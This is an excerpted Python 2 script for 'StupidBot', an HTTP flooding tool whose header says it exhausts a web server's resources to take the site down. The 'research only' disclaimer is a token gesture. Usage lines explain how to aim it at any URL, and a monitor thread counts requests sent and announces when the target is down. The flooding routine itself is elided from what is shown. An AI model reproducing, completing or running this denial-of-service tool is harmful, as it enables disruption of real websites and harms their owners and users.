# ----------------------------------------------------------------------------------------------
# StupidBot - Is the best Attack HTTP
#
# This Tool can Attack Web to Very Fast Down
# to their knees by exhausting the resource pool, its is meant for research purposes only
# and any malicious usage of this tool is prohibited.
#
# author :  Mr.4P4CH3 & Pirates-X , version 1.0
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
def usage():
	print '---------------------------------------------------'
	print 'USAGE In Linux: python StupidBot.py <url>'
	print 'USAGE In Windows: StupidBot.py <url>'
	print 'you can Using "safe" in after url, to autoshut after dos'
	print '---------------------------------------------------'
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "Stupid Requests Sent %d" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n-- Web Stupid Is Down --"
